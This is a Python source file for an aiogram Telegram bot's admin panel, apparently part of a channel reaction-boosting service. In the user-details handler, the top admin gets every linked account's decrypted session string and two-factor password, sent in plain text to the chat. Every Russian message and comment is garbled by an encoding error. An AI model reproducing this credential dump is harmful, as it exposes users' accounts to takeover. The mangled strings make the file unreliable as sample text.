from aiogram.filters import Command, StateFilter

from aiogram import types
from aiogram.fsm.context import FSMContext
from loader import dp, bot, app_logger
from config_data.config import ALLOWED_USERS, ADMIN_ID, ENCRYPTION_KEY
from keyboards.inline.accounts import users_markup
from keyboards.inline.channels import admin_channels_markup, get_channel_actions_keyboard
from states.states import AdminPanel
from sqlalchemy.future import select
from database.models import User, UserChannel, async_session
from services.channel_manager import ChannelManager


@dp.message(Command('admin_panel'))
async def admin_panel(message: types.Message, state: FSMContext):
    if int(message.from_user.id) in ALLOWED_USERS:
        app_logger.info(f"–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä @{message.from_user.username} –≤–æ—à–µ–ª –≤ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å.")
        markup = await users_markup()
        await message.answer("–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:", reply_markup=markup)
        await state.set_state(AdminPanel.get_users)
    else:
        await message.answer("–£ –≤–∞—Å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤")


@dp.callback_query(StateFilter(AdminPanel.get_users))
async def get_user(call: types.CallbackQuery, state: FSMContext):
    await call.answer()
    if call.data == "–í—ã—Ö–æ–¥":
        await call.message.answer("–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã—à–ª–∏ –∏–∑ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª–∏.")
        await state.clear()
        app_logger.info(f"–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä @{call.from_user.username} –≤—ã—à–µ–ª –∏–∑ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª–∏.")
    elif call.data == "channels":
        # –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ø–∏—Å–∫—É –∫–∞–Ω–∞–ª–æ–≤
        await show_channels(call, state)
    else:
        async with async_session() as session:
            result = await session.execute(select(User).where(User.id == int(call.data)))
            user_obj = result.scalars().first()
        if user_obj:
            text = f"–ò–º—è: {user_obj.full_name}\n–¢–µ–ª–µ–≥—Ä–∞–º: @{user_obj.username}\n"
            if int(call.from_user.id) == ADMIN_ID:
                from services.account_manager import AccountService
                service = AccountService(ENCRYPTION_KEY)
                accounts = await service.get_user_accounts(user_obj.user_id)

                session_text = "\nüîë –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏:\n"
                for acc in accounts:
                    session_str = await service.decrypt_session(acc.session_data)
                    password_2fa = await service.get_2fa_password(acc.phone)
                    session_text += f"üì± {acc.phone} ({password_2fa}): {session_str}\n\n"
                text += session_text
            await call.message.answer(text)
        else:
            await call.message.answer("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")


# –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –∫–∞–Ω–∞–ª–æ–≤ –≤ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
@dp.callback_query(lambda call: call.data == "channels")
async def show_channels(call: types.CallbackQuery, state: FSMContext):
    """–ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –∫–∞–Ω–∞–ª–æ–≤ –≤ —Å–∏—Å—Ç–µ–º–µ"""
    try:
        async with async_session() as session:
            channel_manager = ChannelManager(session)
            # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –∫–∞–Ω–∞–ª—ã –∏–∑ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
            result = await session.execute(select(UserChannel).limit(10))
            channels = result.scalars().all()
            
            if not channels:
                await call.message.edit_text(
                    "–í —Å–∏—Å—Ç–µ–º–µ –Ω–µ—Ç –∫–∞–Ω–∞–ª–æ–≤",
                    reply_markup=await admin_channels_markup()
                )
            else:
                await call.message.edit_text(
                    "–°–ø–∏—Å–æ–∫ –∫–∞–Ω–∞–ª–æ–≤ –≤ —Å–∏—Å—Ç–µ–º–µ:",
                    reply_markup=await admin_channels_markup(channels)
                )
                
            await state.set_state(AdminPanel.search_channels)
    except Exception as e:
        app_logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –∫–∞–Ω–∞–ª–æ–≤: {e}")
        await call.answer("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –∫–∞–Ω–∞–ª–æ–≤")


@dp.callback_query(StateFilter(AdminPanel.search_channels), lambda call: call.data == "search_channel")
async def search_channel_start(call: types.CallbackQuery, state: FSMContext):
    """–ù–∞—á–∏–Ω–∞–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–∏—Å–∫–∞ –∫–∞–Ω–∞–ª–∞"""
    await call.message.edit_text("–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏–ª–∏ —é–∑–µ—Ä–Ω–µ–π–º –∫–∞–Ω–∞–ª–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞:")
    await state.set_state(AdminPanel.waiting_for_channel_search)


@dp.message(StateFilter(AdminPanel.waiting_for_channel_search))
async def search_channel_process(message: types.Message, state: FSMContext):
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –ø–æ–∏—Å–∫–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –ø–æ –∫–∞–Ω–∞–ª–∞–º"""
    search_query = message.text.strip()
    
    if not search_query:
        await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–∏—Å–∫–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å")
        return
        
    try:
        async with async_session() as session:
            channel_manager = ChannelManager(session)
            channels = await channel_manager.search_channels(search_query)
            
            if not channels:
                await message.answer(
                    f"–ü–æ –∑–∞–ø—Ä–æ—Å—É '{search_query}' –Ω–∏—á–µ–≥–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ",
                    reply_markup=await admin_channels_markup()
                )
            else:
                await message.answer(
                    f"–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–æ–∏—Å–∫–∞ –ø–æ –∑–∞–ø—Ä–æ—Å—É '{search_query}':",
                    reply_markup=await admin_channels_markup(channels)
                )
                
            await state.set_state(AdminPanel.search_channels)
    except Exception as e:
        app_logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∏—Å–∫–µ –∫–∞–Ω–∞–ª–æ–≤: {e}")
        await message.answer("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∏—Å–∫–µ –∫–∞–Ω–∞–ª–æ–≤")


@dp.callback_query(StateFilter(AdminPanel.search_channels), lambda call: call.data.startswith("admin_channel_"))
async def show_channel_details(call: types.CallbackQuery, state: FSMContext):
    """–ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –¥–µ—Ç–∞–ª–∏ –∫–∞–Ω–∞–ª–∞ –∏ –≤–∞—Ä–∏–∞–Ω—Ç—ã –¥–µ–π—Å—Ç–≤–∏–π"""
    channel_id = int(call.data.split("_")[-1])
    
    try:
        async with async_session() as session:
            channel_manager = ChannelManager(session)
            channel = await channel_manager.get_channel(channel_id)
            
            if not channel:
                await call.answer("–ö–∞–Ω–∞–ª –Ω–µ –Ω–∞–π–¥–µ–Ω")
                return
                
            # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–µ —Ä–µ–∞–∫—Ü–∏–∏ –∫–∞–Ω–∞–ª–∞
            try:
                available_reactions, user_reactions = await channel_manager.get_channel_reactions(channel.id)
            except Exception:
                available_reactions, user_reactions = [], []
                
            user_reactions = available_reactions if user_reactions is None else user_reactions
            reactions_text = " ".join(user_reactions) if user_reactions else "–Ω–µ –≤—ã–±—Ä–∞–Ω—ã"
            
            text = f"üì¢ –ö–∞–Ω–∞–ª: {channel.channel_title}\n"
            text += f"Username: @{channel.channel_username}\n"
            text += f"ID: {channel.channel_id}\n"
            text += f"–°—Ç–∞—Ç—É—Å: {'–∞–∫—Ç–∏–≤–µ–Ω' if channel.is_active else '–Ω–µ–∞–∫—Ç–∏–≤–µ–Ω'}\n"
            text += f"–ú–∏–Ω–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–µ–∞–∫—Ü–∏–π: {channel.min_reactions}\n"
            text += f"–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–µ–∞–∫—Ü–∏–π: {channel.max_reactions}\n"
            text += f"–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤: {channel.views}\n"
            text += f"–†–µ–∞–∫—Ü–∏–∏: {reactions_text}\n"
            
            await call.message.edit_text(
                text,
                reply_markup=get_channel_actions_keyboard(channel.id, 0, 1)
            )
    except Exception as e:
        app_logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–∞–Ω–∞–ª–µ: {e}")
        await call.answer("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–∞–Ω–∞–ª–µ")


@dp.callback_query(StateFilter(AdminPanel.search_channels), lambda call: call.data == "back_to_admin")
async def back_to_admin_panel(call: types.CallbackQuery, state: FSMContext):
    """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –∞–¥–º–∏–Ω–∫–∏"""
    await call.answer()
    markup = await users_markup()
    await call.message.edit_text("–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:", reply_markup=markup)
    await state.set_state(AdminPanel.get_users)
